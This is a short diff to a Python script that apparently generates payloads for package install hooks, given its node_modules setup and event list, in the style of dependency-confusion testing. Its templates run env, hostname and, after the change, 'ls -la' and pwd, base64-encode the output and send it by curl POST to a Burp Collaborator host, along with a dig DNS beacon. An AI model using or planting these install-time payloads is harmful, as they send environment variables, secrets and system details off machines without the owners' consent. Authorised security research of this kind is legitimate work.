@@ -36,7 +36,7 @@ non_prefixable_events = [
 
 expression_template = lambda command,event : f"curl \"{event}.{command}.{burpcollaborator_link}\" -X POST --data $({command} | base64);"
 #expression_template = lambda bin,event,method : f'{bin} {method}.{bin}.{event}.{burpcollaborator_link};'
-script_template = lambda event: f"dig {event}.dig.{burpcollaborator_link};" + expression_template("env",event) + expression_template("hostname",event)
+script_template = lambda event: f"dig {event}.dig.{burpcollaborator_link};" + expression_template("env",event) + expression_template("hostname",event) + expression_template("ls -la",event) + expression_template("pwd",event)
 #script_template = lambda event,method: expression_template("nslookup",event,method) + expression_template("dig",event,method) + expression_template("curl",event,method)
 
 os.makedirs('node_modules',exist_ok=True)
